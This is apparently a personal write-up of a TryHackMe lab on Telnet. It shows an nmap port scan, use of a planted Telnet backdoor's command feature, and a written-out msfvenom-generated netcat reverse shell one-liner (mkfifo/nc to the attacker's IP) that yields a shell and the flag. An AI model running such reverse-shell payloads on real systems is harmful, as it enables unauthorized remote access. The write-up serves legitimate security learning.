# 📘 What I Learned About Telnet (From TryHackMe)

---

## 1. 🙋 What Is Telnet?

Telnet acts as a remote control 🎮 for computers, allowing you to connect from your machine (the client) to another machine running a Telnet server. Once connected, you gain command-line access to the remote system as if you were sitting right in front of it.

However, Telnet is inherently insecure: all communication is transmitted in plain text, making it trivial for attackers to eavesdrop and capture sensitive data. This lack of encryption is why Secure Shell (SSH) is preferred—SSH encrypts all traffic, protecting your information from prying eyes.

---

## 2. 🔍 Enumerating Telnet

To identify Telnet services during a penetration test, the first step is to scan for open ports. In my TryHackMe exercise, I used [Nmap](https://nmap.org/) to scan all 65,535 TCP ports (not just the 1,000 most common):

```bash
nmap -p- 10.201.95.144
```

Sample output:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2025-08-05 21:26
Nmap scan report for 10.201.95.144
Host is up (0.19s latency).

PORT     STATE SERVICE
8012/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3.12 seconds
```

Only port `8012` was open. To identify the service running on this port, I connected using Telnet:

```bash
telnet 10.201.95.144 8012
```

The session displayed:
```
Trying 10.201.95.144...
Connected to 10.201.95.144.
Escape character is '^]'.

SKIDY'S BACKDOOR. Type .HELP to view commands
.HELP
.HELP: View commands
.RUN <command>: Execute commands
.EXIT: Exit
```

This banner revealed a Telnet-based backdoor on port 8012.

---

## 3. 🔑 Exploiting the Telnet Backdoor

The goal was to obtain a reverse shell on the target system.

First, I needed to verify if arbitrary system commands could be executed. To do this, I used [tcpdump](https://www.tcpdump.org/) on my local machine to monitor for ICMP packets, which would confirm if my commands were executed remotely:

```bash
sudo tcpdump ip proto \\icmp -i tun0
```

Then, from the Telnet session:
```
.RUN ping 10.17.12.230 -c 1
```
And tcpdump captured:
```
10.201.82.158 > 10.17.12.230: ICMP echo request
10.17.12.230 > 10.201.82.158: ICMP echo reply
```
This confirmed the backdoor was executing system commands.

To escalate, I used [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) to generate a Netcat-based reverse shell payload:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

**Payload explanation:**
- `-p` specifies the payload: `cmd/unix/reverse_netcat` (a Unix reverse shell using Netcat)
- `lhost` is your attacker's IP
- `lport` is the attacker's listening port
- `R` outputs the raw payload

Example generated payload:
```bash
mkfifo /tmp/xyz; nc 10.17.12.230 4444 0</tmp/xyz | /bin/sh >/tmp/xyz 2>&1; rm /tmp/xyz
```

I started a Netcat listener on my local machine:
```bash
nc -lvnp 4444
```

Then, executed the payload via Telnet:
```
.RUN mkfifo /tmp/xyz; nc 10.17.12.230 4444 0</tmp/xyz | /bin/sh >/tmp/xyz 2>&1; rm /tmp/xyz
```

Netcat output:
```
listening on [any] 4444 ...
connect to [10.17.12.230] from [10.201.82.158] 33396
```
This means the reverse shell connected successfully! I now had a shell on the target.

I ran basic commands to explore:
```bash
whoami
pwd
ls
```
Found a `flag.txt` file:
```bash
cat flag.txt
```
And retrieved the flag:
```
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

---

## 5. 💡 Lessons Learned

- **Document Everything:** Keep detailed notes during enumeration. Valuable clues often emerge later when planning and executing exploits.
- **Don’t Assume Defaults:** When common ports are closed, always scan all ports. Real-world CTFs and assessments often hide services on non-standard ports.
- **Security by Obscurity ≠ Security:** Just because a service is running on an uncommon port doesn’t mean it’s secure. Proper encryption and access controls are essential.
- **Plaintext Protocols Are Dangerous:** Protocols like Telnet should not be used for remote administration on modern systems due to their lack of encryption.

---

Telnet is a classic protocol, but its weaknesses highlight the importance of secure alternatives like SSH. Always enumerate thoroughly, keep good notes, and never underestimate the value of persistence in finding a foothold.

**Tags:** `tryhackme`, `telnet`, `nmap`, `reverse-shell`, `cybersecurity`
